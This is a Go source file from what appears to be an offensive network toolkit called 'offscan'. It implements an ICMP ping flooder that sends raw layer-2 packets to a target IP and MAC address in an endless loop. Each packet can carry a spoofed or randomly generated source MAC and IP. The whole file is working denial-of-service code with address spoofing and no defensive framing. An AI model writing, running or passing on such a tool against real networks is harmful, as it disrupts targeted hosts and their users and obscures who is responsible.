package floodping

import (
	"fmt"
	"net"
	"time"

	"offscan/conv"
	"offscan/generators"
	"offscan/ifaceinfo"
	"offscan/packet"
	"offscan/sockets"
	"offscan/sysinfo"
	"offscan/utils"
)



type PingFlooder struct {
    rand      *generators.RandomValues
    builder   *packet.IcmpPkt
    iface     *net.Interface
    pktsSent   int
    srcIP      net.IP
    srcMAC     net.HardwareAddr
    dstIP      net.IP
    dstMAC     net.HardwareAddr
    duration   float64
}



func New(argList []string) *PingFlooder {
	args   := ParsePingArgs(argList)

	dstIP  := conv.MustStrToIPv4(args.DstIP)
	dstMAC := conv.MustStrToMac(args.DstMAC)

	iface  := sysinfo.MustRouteIfaceForDstIP(dstIP)
    cidr   := ifaceinfo.MustCIDR(iface)
	
	srcIP  := net.ParseIP(args.SrcIP)
	srcMAC := sysinfo.ResolveMac(args.SrcMAC, iface)

    firstIP, lastIP := utils.GetFirstAndLastIP(cidr)

    randGen := generators.NewRandomValues(&firstIP, &lastIP)


    return &PingFlooder{
        rand:      randGen,
        builder:   packet.NewIcmpPkt(),
        iface:     iface,
        srcIP:     srcIP,
        srcMAC:    srcMAC,
        dstIP:     dstIP,
        dstMAC:    dstMAC,
    }
}



func (p *PingFlooder) Execute() {
    p.displayInfo()
    p.sendEndlessly()
    p.displayExecInfo()
}



func (p *PingFlooder) displayInfo() {
    srcMACStr := "Random"
	if p.srcMAC != nil {
        srcMACStr = p.srcMAC.String()
    }

	srcIPStr := "Random"
    if p.srcIP != nil {
        srcIPStr = p.srcIP.String()
    }

    fmt.Printf("[*] SRC >> MAC: %s / IP: %s\n", srcMACStr, srcIPStr)
    fmt.Printf("[*] DST >> MAC: %s / IP: %s\n", p.dstMAC.String(), p.dstIP.String())
    fmt.Printf("[*] IFACE: %s\n", p.iface.Name)
}



func (p *PingFlooder) sendEndlessly() {
    socket := sockets.NewL2Socket(p.iface)
    ctx    := utils.SignalContext()

    fmt.Println("[+] Sending packets. Press CTRL + C to stop")
    start := time.Now()

    for {
        select {
        case <-ctx.Done():
            fmt.Println("\n[-] Flood interrupted")
            p.duration = time.Since(start).Seconds()
            return
        
		default:
            pkt := p.getPacket()
            socket.Send(pkt)
            p.pktsSent++
        }
    }
}



func (p *PingFlooder) getPacket() []byte {
    srcMAC := p.srcMAC
	if srcMAC == nil {
        srcMAC = p.rand.RandomMac()
    }

	srcIP := p.srcIP
    if srcIP == nil {
        srcIP = p.rand.RandomIP()
    }

	return p.builder.L2Pkt(srcMAC, srcIP, p.dstMAC, p.dstIP)
}



func (p *PingFlooder) displayExecInfo() {
    fmt.Printf("[%%] %d packets sent in %.2f seconds\n", p.pktsSent, p.duration)
    
	if p.duration > 1.0 {
        rate := float64(p.pktsSent) / p.duration
        fmt.Printf("[%%] %.2f packets sent per second\n", rate)
    }
}